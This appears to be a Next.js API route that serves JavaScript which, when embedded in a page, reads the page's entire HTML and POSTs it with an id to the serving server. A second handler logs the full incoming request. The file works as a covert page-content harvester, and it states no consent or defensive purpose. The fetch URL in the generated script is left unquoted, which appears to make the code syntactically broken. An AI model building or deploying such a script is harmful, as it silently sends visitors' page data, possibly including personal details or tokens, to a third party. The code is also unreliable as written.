import { NextResponse } from "next/server";

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const id = searchParams.get("id") || null;

  const domain = req.url.split("api")[0];

  if (id) {
    console.log("id has been added:", id);
    const scriptContent = `
      const body = document.body.innerHTML;
      console.log(body);
      async function sendData(data) {
        const res = await fetch(${domain}/api/js?id=${id},{method: "POST", body: data })
        console.log(res.status);
      }
      sendData(body);
    `;

    return new NextResponse(scriptContent, {
      headers: {
        "Content-Type": "application/javascript",
        "Cache-Control": "no-store, max-age=0",
      },
    });
  } else {
    console.log("no id has been added");
    return new NextResponse(`<h1>null</h1>`);
  }
}

export async function POST(req: Request) {
  const { searchParams } = new URL(req.url);
  const id = searchParams.get("id") || null;

  console.log(id);
  console.log(req);
  return new Response(
    JSON.stringify({ message: "Data received successfully" }),
    {
      status: 200,
    },
  );
}
